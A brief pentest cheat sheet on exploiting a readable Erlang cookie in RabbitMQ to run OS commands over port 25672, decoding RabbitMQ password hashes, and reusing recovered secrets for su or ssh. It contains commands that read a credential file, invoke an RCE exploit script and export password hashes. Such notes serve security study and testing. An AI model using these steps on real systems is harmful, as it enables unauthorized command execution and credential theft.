# RabbitMQ / Erlang Cookie RCE + Password Hash Reuse

A readable `.erlang.cookie` (commonly at `/var/lib/rabbitmq/.erlang.cookie` or `~/.erlang.cookie`) lets you authenticate to the Erlang distribution protocol (port 25672) and run OS commands.

```bash
cat /var/lib/rabbitmq/.erlang.cookie
python2 shell-erldp2.py <target> 25672 <erlang_cookie> '<command>'   # off-the-shelf erl-matter-style exploit
```

RabbitMQ stores its own user password hashes as `base64(4-byte salt + sha256(salt + password))`. If you can dump `rabbit.definitions.json` (needs RabbitMQ admin, e.g. via `rabbitmqctl add_user`/`set_user_tags` once you have cookie access):

```bash
rabbitmqadmin export rabbit.definitions.json -u <user> -p <pass>
python3 -c "
import base64
raw = base64.b64decode('<password_hash>')
print('salt:', raw[:4].hex(), 'digest:', raw[4:].hex())
"
```
Always try the recovered value against other accounts too (`su`, `ssh`) — app-layer secrets get reused as OS passwords more often than you'd expect.
